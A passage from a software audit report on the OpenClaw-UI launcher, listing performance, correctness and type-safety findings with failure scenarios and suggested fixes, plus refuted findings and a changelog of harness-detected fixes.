**Failure scenario.** GitHub throttles the tarball download and it exceeds 60s. Node terminates cmd.exe; curl and tar keep running. installGithubSkill's catch calls rmSync on tmpDir, which fails with EPERM because tar still has files open, and the error is discarded. ~/.openclaw/skills/.tmp-skill-creator-4f2a91cc remains forever, is picked up by listInstalled(), and lands in marketplaceInstalledNames. Repeat on the next launch to accumulate another one.

**Suggested fix.** Stage into os.tmpdir() rather than inside SKILLS_DIR, and drive the download with spawn + detached:false plus explicit tree kill (or fetch the tarball in-process and extract with a library) so the timeout actually reaps curl and tar. Retry the tmp cleanup after a short delay, and sweep stale `.tmp-*` entries in SKILLS_DIR on startup. Have listInstalled skip dot-prefixed directories.

### 47. Phosphor ships all 6 weights per icon; the app renders only one

`src/renderer/App.tsx:3` · dead-code

Every icon import resolves to dist/csr/<Icon>.es.js, which imports dist/defs/<Icon>.es.js. That defs module builds `new Map([["bold", ...], ["duotone", ...], ["fill", ...], ["light", ...], ["regular", ...], ["thin", ...]])` with a full React element and SVG path set per weight, at module scope (verified in node_modules/@phosphor-icons/react/dist/defs/Paperclip.es.js, 2,788 bytes for one icon). Rollup cannot tree-shake entries out of a Map literal, so all six ship. Byte-probing index-BK8g-4Q0.js shows SVG path data from ~320k to ~498k, i.e. ~178 kB or 21% of the bundle, for the 60 distinct icons imported across the renderer (~3.0 kB each). IconBase.es.js selects one weight at render time via `m.get(weight ?? "regular")`. The app passes a non-default weight in exactly three places: ConversationView.tsx:644 (weight="fill"), InputBar.tsx:595 and InputBar.tsx:604 (weight="bold"). Icon-level tree-shaking does work (unused icon names are absent from the bundle), so this is purely the weight axis. As a second cost, all 6 weights of all 60 icons are eagerly constructed as React elements at module evaluation — ~360 elements plus their nested path/fragment children created before first paint.

**Failure scenario.** Startup parses ~178 kB of SVG path data and materialises ~360 React element trees, of which ~148 kB and ~300 trees correspond to weights (thin, light, bold, fill, duotone) that no code path can ever request.

**Suggested fix.** Replace the barrel import with a small local icon module exporting inline single-weight SVGs for the 60 icons actually used (keeping fill for ConversationView.tsx:644 and bold for InputBar.tsx:595/604). Estimated saving ~148 kB raw / ~40 kB gzip, plus ~300 fewer element allocations at module load.

### 48. Dead `hovered` state re-renders the whole message list on every pointer enter and leave ✅ **fixed**

`src/renderer/components/ConversationView.tsx:69` · dead-code

`const [hovered, setHovered] = useState(false)` is declared at line 69 and the value `hovered` is never read anywhere in the file (grep for the identifier returns only line 69). setHovered is still wired to the container at lines 269-270 via onMouseEnter/onMouseLeave. Each call flips real React state, so moving the pointer into or out of the conversation area triggers a full re-render of ConversationView — which, per the slice/memo issue at line 120, also re-slices and re-groups the message list, re-runs the searchableIds filter at line 128, and re-renders every unmemoized UserMessage, SystemMessage and ToolGroup child.

**Failure scenario.** User moves the mouse across the panel: each entry/exit of the conversation region schedules a full re-render of the entire visible message list to update a boolean that no JSX reads.

**Suggested fix.** Delete the useState at line 69 and the onMouseEnter/onMouseLeave handlers at lines 269-270.

### 49. Search filter lowercases the entire conversation on every streaming frame ✅ **fixed**

`src/renderer/components/ConversationView.tsx:128` · performance

The searchableIds memo (lines 128-137) depends on [allMessages, normalizedQuery]. allMessages is tab.messages, which sessionStore.ts:930-938 replaces with a new array on every text_chunk flush, so the dependency changes at the rAF flush rate. The body calls `m.content.toLowerCase()` on every user, assistant and system message in the whole conversation — not the 100-message visible window — allocating a full lowercase copy of the entire transcript each time. It is gated only on normalizedQuery being non-empty, so it costs nothing until the user types in the search box, and then costs O(total transcript bytes) per frame.

**Failure scenario.** User types one character into the chat search box while a reply is streaming into a 200 kB conversation. Every rAF flush thereafter allocates and scans ~200 kB of lowercased strings — ~12 MB/s of pure garbage — until the search box is cleared.

**Suggested fix.** Cache the lowercased content per message id (a Map keyed by message.id whose value is invalidated only when that message's content changes), or debounce the query and restrict the scan to messages whose content actually changed since the last computation.

### 50. msgIndex mixes grouped-item index with message index, mis-classifying historical messages

`src/renderer/components/ConversationView.tsx:409` · correctness

`const msgIndex = startIndex + idx` treats `idx` — the index into `grouped` — as if it were an index into `visibleMessages`. But `groupMessages` (line 35-58) collapses a consecutive run of N tool messages into a single `{kind: 'tool-group'}` item, so `grouped.length < visibleMessages.length` whenever any tool ran. `msgIndex` therefore under-counts by (total tool messages - number of tool groups) seen so far, and feeds `isHistorical = msgIndex < historicalThreshold` (line 410), which drives `skipMotion` on every message component.

**Failure scenario.** A conversation with 40 messages of which 25 are tool calls grouped into 5 groups: `grouped` has 20 items, `historicalThreshold = 40 - 20 = 20`. The newest message sits at `idx = 19`, so `msgIndex = 19 < 20` -> `isHistorical = true` -> `skipMotion` -> the just-arrived assistant reply renders with no entrance animation, while the design intends the last 20 messages to animate in. The heavier the tool usage, the further back the animation cutoff silently slides.

**Suggested fix.** Carry the true message index on each GroupedItem when building it in `groupMessages` (e.g. `{ kind, message, sourceIndex }`), and compare `startIndex + sourceIndex` against `historicalThreshold`.

### 51. Infinite width animation keeps running at 60 Hz while the launcher is parked off-screen

`src/renderer/components/ConversationView.tsx:778` · performance

AssistantTypingBubble (ConversationView.tsx:761-782) renders three motion.div elements with `repeat: Infinity` animating `width` between percentage keyframes plus opacity. Animating width is a layout-triggering property, so each frame forces layout and paint for all three. The bubble is mounted whenever showTypingBubble is true (ConversationView.tsx:234-250), which includes tab.status === 'completed' with no assistant reply yet, and the whole run duration. It is not unmounted when the shell is collapsed — App.tsx:648-661 animates the body to height 0 / opacity 0 but keeps children mounted. Crucially, the shell never hides the window: shell/src/main.cpp:426-433 parks it at park_x off the virtual screen, and the comment at main.cpp:382-384 says hide() is deliberately avoided. So document.hidden stays false and rAF keeps firing at full rate. App.tsx:139 then explicitly sets `MotionGlobalConfig.skipAnimations = false` inside onWindowDismiss, immediately before the window parks, so animations are re-enabled for a surface nobody can see. animate-pulse-dot (index.css:142, used at ConversationView.tsx:503 and TabStrip.tsx:30) and animate-spin (ConversationView.tsx:1094) run under the same conditions.

**Failure scenario.** User sends a prompt, presses Alt+Space to dismiss, and waits. The window parks off-screen but stays composited; three infinite width tweens plus a CSS pulse and any tool spinners keep driving ~180 layout+paint operations per second for the entire duration of a multi-minute agent run, on battery, with nothing on screen.

**Suggested fix.** Gate the animations on visibility: keep MotionGlobalConfig.skipAnimations true after dismiss (do not reset it at App.tsx:139 until onWindowShown), or unmount AssistantTypingBubble while parked by tracking a store flag set from onWindowDismiss/onWindowShown. Also switch the bubble to transform/scaleX so it never triggers layout. Saves continuous CPU whenever a run outlives a dismiss — the normal usage pattern.

### 52. Zero-argument useRef fails to compile under @types/react 19 ✅ **fixed**

`src/renderer/components/MarketplacePanel.tsx:42` · type-safety

`const debounceRef = useRef<ReturnType<typeof setTimeout>>()` is called with no argument. The installed `@types/react` is 19.2.14, whose only `useRef` overloads (index.d.ts:1737, 1749, 1761) are `useRef<T>(initialValue: T)`, `useRef<T>(initialValue: T | null)`, and `useRef<T>(initialValue: T | undefined)` — React 19 removed the zero-argument form. `tsconfig.json` includes `src/**/*` with `strict: true`, so `npm run typecheck` (`tsc --noEmit -p tsconfig.json`) fails on this line. It is the only zero-arg `useRef` in the tree.

**Failure scenario.** Run `npm run typecheck` (or any CI gate that does): tsc reports `error TS2554: Expected 1 arguments, but got 0` at MarketplacePanel.tsx:42 and the check exits non-zero. Vite's esbuild transform strips types without checking them, so `npm run build` still succeeds — the failure only surfaces in typecheck/CI, which is why it has survived.

**Suggested fix.** `const debounceRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined)`. The `clearTimeout(debounceRef.current)` calls at lines 46 and 50 already tolerate `undefined`.

### 53. Dead zustand v5 equality fn in ModelPicker — re-renders on every streaming token ✅ **fixed**

`src/renderer/components/StatusBar.tsx:19` · performance

`useSessionStore(selector, equalityFn)` no longer honours the second argument. Installed zustand is 5.0.11, and `node_modules/zustand/react.js` defines the bound hook as `const useBoundStore = (selector) => useStore(api, selector)` — the second argument is dropped on the floor, so comparison falls back to `Object.is` on the selector result. The selector returns `s.tabs.find(...)`, i.e. the tab object itself, and `handleNormalizedEvent` rebuilds that object on every event (`const updated = { ...tab, lastEventAt: Date.now() }`, sessionStore.ts:900). The equality fn written here to gate on `status`/`sessionModel` therefore does nothing.

**Failure scenario.** Assistant streams a 500-token reply. Each `text_chunk` produces a fresh tab object (sessionStore.ts:900, 926-939), so `Object.is(prevTab, nextTab)` is false and ModelPicker re-renders ~500 times, each pass re-running `openclawModels.find(...)`/`getModelDisplayLabel` and, while the dropdown is open, re-rendering the portalled 192px list. The author's guard `a.status === b.status && a.sessionModel === b.sessionModel` — which would have collapsed all 500 to zero renders — is silently ignored.

**Suggested fix.** Use `useShallow` from `zustand/react/shallow`, or select primitives directly: `const tabStatus = useSessionStore((s) => s.tabs.find((t) => t.id === s.activeTabId)?.status)` and `const sessionModel = useSessionStore((s) => s.tabs.find((t) => t.id === s.activeTabId)?.sessionModel)`.

### 54. task_update text fallback fires only for the first assistant turn of a multi-turn run

`src/renderer/stores/sessionStore.ts:996` · correctness

The fallback exists (per the comment at lines 980-984) to render assistant text when `text_chunk` deltas did not arrive for a run. Its guard scopes "this run" to everything after the last user message: `hasStreamedText` is true if any assistant message without a `toolName` exists after `lastUserIdx` (lines 992-994). `normalizeAssistant` emits one `task_update` per assistant message (event-normalizer.ts:111-116), and an agent run is multi-turn — text, tool, text, tool, final text — with no user message between turns. So the first turn's text is appended, which immediately makes `hasStreamedText` true, and every subsequent turn's text is discarded. `task_complete`'s last-resort fallback (lines 1057-1059) recomputes the identical predicate over the identical range, so it is also skipped.

**Failure scenario.** Deltas are unavailable for a run (the exact case this code is for). The agent replies across three turns: "I'll look at the config." → Read → "The port is wrong, fixing it." → Edit → "Done, port is now 8080." Turn 1's text is appended. Turn 2's `task_update` sees an assistant message after the last user message, so "The port is wrong, fixing it." is dropped; turn 3's is dropped the same way; `task_complete`'s `hasAnyText` is also true so `event.result` is not used. The user sees only "I'll look at the config." and never learns what the agent did.

**Suggested fix.** Track per-run text state rather than inferring it from the message list — e.g. stamp assistant messages with the `activeRequestId` that produced them and test only messages from the current run, or dedupe by comparing the assembled `textContent` against what is already rendered for this turn instead of asking whether *any* assistant text exists.

### 55. parseColor's NAMED lookup walks Object.prototype and throws on the seed value 'constructor'

`src/renderer/theme-derive.ts:42` · correctness

theme-derive.ts:42 is `if (NAMED[s]) s = NAMED[s]` against the plain object literal `NAMED` (lines 27-35), whose prototype chain is Object.prototype. Because line 40 lowercases the input first, any all-lowercase inherited key resolves: `NAMED['constructor']` returns the `Object` function (truthy) and `NAMED['__proto__']` returns Object.prototype (truthy). `s` is then assigned a non-string, and line 43's `s.charAt(0)` throws. I confirmed this against the shipped derivation: `derivePalette({...openclawDark, accent:'constructor'}, effects, true)` throws `TypeError: s.charAt is not a function`. The throw propagates out of derivePalette, so it is not a crash — `paletteFor` catches it at theme.ts:359-362 and ThemeCard catches it at AppearancePanel.tsx:334 — but the recovery is the silent worst case: theme.ts:361 returns the legacy hardcoded `darkColors`/`lightColors`, i.e. the whole UI reverts to OpenClaw browns with no indication why.

**Failure scenario.** In the Appearance panel's Colours section, type `constructor` into any of the ten seed text fields (the field explicitly accepts free-form input, per the comment at AppearancePanel.tsx:397-398 — rgb(), shorthand hex, and colour names are all valid). derivePalette throws for every token, paletteFor swallows it, and the entire launcher snaps to the legacy OpenClaw palette instead of the user's theme, while the seed field still shows the value they typed and the theme card preview goes blank. No error surfaces anywhere.

**Suggested fix.** Use an own-property lookup, e.g. change line 42 to `const named = Object.prototype.hasOwnProperty.call(NAMED, s) ? NAMED[s] : undefined; if (named) s = named`, or build NAMED with `Object.create(null)` / a `Map`. As defence in depth, guard `typeof s === 'string'` before line 43.

### 56. Initial isDark ignores themeMode 'system', so a light-desktop user gets a dark first paint

`src/renderer/theme.ts:540` · ux

theme.ts:540 computes `const initialIsDark = saved.themeMode === 'light' ? false : true`, collapsing 'system' into dark, and theme.ts:576 seeds `_systemIsDark: true` for the same reason. `applyTheme(initialIsDark, initialTheme)` then runs synchronously at module scope (line 645), so the first paint is committed dark. The real OS value only arrives asynchronously via App.tsx:75-77 (`window.clui.getTheme().then(({isDark}) => setSystemTheme(isDark))`), which reaches theme.ts:593-596 and re-commits. Note this is a round trip through the shim to the shell's exposed `get_dark_mode` (the sidecar comment at sidecar/index.ts:617-625 documents that GET_THEME is deliberately not handled in Node), so the gap is a full IPC round trip, not a microtask. React 19 StrictMode also runs that effect twice in development, doubling the re-commit.

**Failure scenario.** A user on a light-themed Windows desktop with the launcher set to 'system' summons it with Alt+Space. The panel paints with the dark palette (containerBg #242422, textPrimary #ccc9c0), then flips to the light palette once getTheme resolves — a visible flash on every cold start, and on every summon that races the resolve.

**Suggested fix.** Persist the last-known system value alongside the other settings so the synchronous boot path can use it: add `systemIsDark` to PersistedSettings (theme.ts:476-484), write it from `setSystemTheme`, and make line 540 `saved.themeMode === 'light' ? false : saved.themeMode === 'dark' ? true : saved.systemIsDark`. That makes the first paint correct for every launch after the first.

## Rejected

Findings the verifier refuted, kept so the same ground is not re-covered:

- control-plane: Run 'error' handlers never drain the request queue — queued prompts hang forever and permanently consume global queue slots (The code asymmetry is real, but the claimed failure is not reachable, and one third of the claim is provably dead code.

WHAT IS TRUE (verified by reading):
- s)
- control-plane: Spawn failure during the invisible warmup marks a brand-new tab 'failed' (The code shape is as claimed: src/main/claude/control-plane.ts:845-851 unconditionally calls _setTabStatus(tabId, 'failed') in the synchronous start-failure cat)
- control-plane: _dispatch does not re-validate the tab after awaiting hookServerReady — a closed tab can still spawn an uncancellable child (The code shape is exactly as described, but the window the claim depends on does not exist at runtime.

WHAT I CONFIRMED (all verified by reading, not inferred))
- pty: The incomplete-line buffer is unbounded and fully re-scanned by ~20 regexes on every PTY chunk (The code exists as described: src/main/claude/pty-run-manager.ts:635-654 re-runs stripAnsi (5 chained global regex .replace passes, lines 51-58) over the entire)
- pty: normalizeStreamEvent discards the content-block index on input_json_delta, making parallel tool inputs unassociable (1. The code exists as described. C:/Dev/OpenClaw-UI/src/main/claude/event-normalizer.ts:83-89 does emit `{ type: 'tool_call_update', toolId: '', partialInput: d)
- sidecar: gen-shim emits fire(channel, a, b) for multi-argument sends but fire() takes (channel, args) — extra payload is dropped (The mechanics are real but the defect is not. Confirmed: gen-shim.mjs:183 splices the full payload text into fire(...), and fire(channel, args) at gen-shim.mjs:)
- sidecar: gen-shim silently drops contract methods its regex misses, and emits a syntactically invalid shim for a comma-bearing type annotation (The code at sidecar/gen-shim.mjs:53 and stripTypes at 33-39 exist as described, and I reproduced two of the three sub-behaviours by running the exact regex: a p)
- security: Session-scoped allows are keyed only on the CLI session id and are never cleared (The code exists as described (permission-server.ts:379 writes `session:${sessionId}:tool:${toolName}`, :552 reads it first, and grep confirms scopedAllows is ne)
- security: Non-string session_id in a hook payload strands the request instead of answering it (The code reading is accurate but the claim's reachability and its stated failure scenario both fail verification.

WHAT IS TRUE (I read every line):
- `src/main)
- store: Startup renames tab 0's id, orphaning any run already dispatched under the old id (The code shape is real, but the claimed failure mechanism cannot occur — the backend rejects prompts for tab ids it never issued, so no run is ever dispatched u)
- store: Health reconciliation nulls activeRequestId from a stale snapshot, downgrading the working monitor to a 5s timeout (The claim's code descriptions are literally accurate, but the failure it predicts is unreachable: `useHealthReconciliation` never mutates state at runtime, beca)
- store: tool_call_update/tool_call_complete mutate Message objects in place and ignore the event's toolId/index (The code exists verbatim (sessionStore.ts:959-977: shallow copy at 960/970, in-place writes at 963/973, reverse-find ignoring toolId/index; Message in src/share)
- store: ConversationView returns early before three hooks, breaking hook order when the active tab is missing (The code exists exactly as described: src/renderer/components/ConversationView.tsx:218 is `if (!tab) return null`, above useEffect (220), useEffect (224) and us)
- store: Startup effect is not idempotent under StrictMode and creates a second orphaned backend tab (The code exists as described (App.tsx:86-113 is an unguarded []-dep effect calling window.clui.createTab() at :95 and rewriting tabs[0].id at :97; main.tsx:33-3)
- components: Three hooks run after an early return in ConversationView (rules-of-hooks violation) (The code exists exactly as described: src/renderer/components/ConversationView.tsx:218 is `if (!tab) return null`, followed by useEffect at 220, useEffect at 22)
- components: Dead zustand v5 equality fn in HistoryPicker — re-renders on every streaming token (The code exists as described and the equality fn is genuinely dead (zustand 5.0.11; node_modules/zustand/react.js defines `useBoundStore = (selector) => useStor)
- components: Array-index keys on queuedPrompts, a list that shifts from the front (The cited code does exist verbatim at ConversationView.tsx:475-476 (index keys inside <AnimatePresence>, QueuedMessage has an exit variant at line 716), and the)
- io: build-release.mjs stages shell/build/Release, but shell/web and shell/sidecar only get copied there by a POST_BUILD command that is skipped when the C++ target is up to date (REFUTED. The claim's load-bearing premise — "a POST_BUILD command is attached to the link step, so when no C++ source changed the build system skips the project)
- theme-types: syncThemeShapeToCss writes NaNpx / undefinedpx custom properties for a partial effects object (The quoted code is real: src/renderer/theme.ts:343 does `const fx = theme.effects || {...}` and lines 344-350 do unguarded arithmetic, and validateTheme (src/sh)
- theme-types: placeholder and textTertiary contrast is enforced against containerBg but both are painted on raised surfaces (The code exists as described, but the claim's causal chain does not hold, and its headline failure scenario is unaffected by the alleged defect.

WHAT IS TRUE ()
- theme-types: Thirteen per-event IPC channel constants are dead on both sides (The factual core is accurate but the defect is not. VERIFIED TRUE: src/shared/types.ts:403-412 and :481-483 define 13 IPC keys with zero `IPC.<KEY>` references )
- perf: Five gate-hidden panels are statically imported into the single initial chunk (Every factual assertion in the claim is true — I verified all of them — but they add up to a build-tuning preference, not a defect. Nothing behaves incorrectly )
- perf: groupMessages useMemo can never hit its cache once a conversation exceeds 100 messages (The literal code observation is correct, but the claimed impact and the stated failure scenario do not hold.

What is true: C:\Dev\OpenClaw-UI\src\renderer\comp)
- perf: useWorkingMonitor polls at 1 Hz for the app's whole lifetime, including while parked off-screen (The code descriptions are accurate but the defect does not hold up.

WHAT IS ACCURATE (verified by reading):
- C:/Dev/OpenClaw-UI/src/renderer/hooks/useWorkingM)

## Also fixed, found by the harness rather than the audit

These came out of the new gate itself rather than the subsystem sweep, and are
recorded here so the two lists read as one changelog.

- **Conditional hooks in `ConversationView`** (`react-hooks/rules-of-hooks`).
  `if (!tab) return null` sat above three more hooks, so closing the active tab
  changed the hook count between renders and React threw "rendered fewer hooks
  than expected", taking the whole view down instead of showing an empty state.
  Every hook now runs unconditionally, with the early returns below them.

- **In-place mutation in the store's tool-call reducer** (`tests/renderer/session-store.test.ts`).
  `tool_call_update` and `tool_call_complete` mutated the message object and
  handed back a new array. Zustand saw a change, but the tool rows are
  `React.memo`'d on the message reference, so the streamed command and the
  completed state never repainted — and the mutation also rewrote the message
  inside the previous state snapshot. Both cases now replace the message.

- **Ref read during render in `InputBar`** (`react-hooks/refs`). The slash menu's
  anchor rect came from `wrapperRef.current?.getBoundingClientRect()` evaluated
  during render, which reports the layout from before the render committed and
  never updates while the menu is open. Measured in a layout effect now, with a
  resize listener.

- **`allMessages` allocated a fresh array every render** (`react-hooks/exhaustive-deps`).
  `tab?.messages ?? []` invalidated every downstream `useMemo`, so message
  grouping and the search filter re-ran over the whole transcript on any
  unrelated state change. Memoised on the array identity.

- **`skillCommands` rebuilt every render** (`react-hooks/exhaustive-deps`), which
  meant the send callback could never hold a stable reference to it. Memoised.

- **Ref read in an effect cleanup** in `useClaudeEvents`, which captures whatever
  the ref points at when the cleanup runs rather than when the effect did. Bound
  to a local first.

- **A statically dead branch in the PTY permission path.** After the phase check
  narrowed `permissionPhase` to `'idle' | 'detecting'`, the code re-read that
  same field looking for `'waiting_user'` — a comparison TypeScript proved could
  never be true. `_checkPermissionInBuffer` now returns whether it emitted.

- **41 typecheck errors on `main`.** The repo did not compile: Zustand 5 selector
  signatures, a `useRef` with no argument under `@types/react` 19, an inert
  `declare module '*.mp3'`, and two palette tokens that do not exist. All fixed;
  `npm run typecheck` is clean and now covers `tests/` as well.
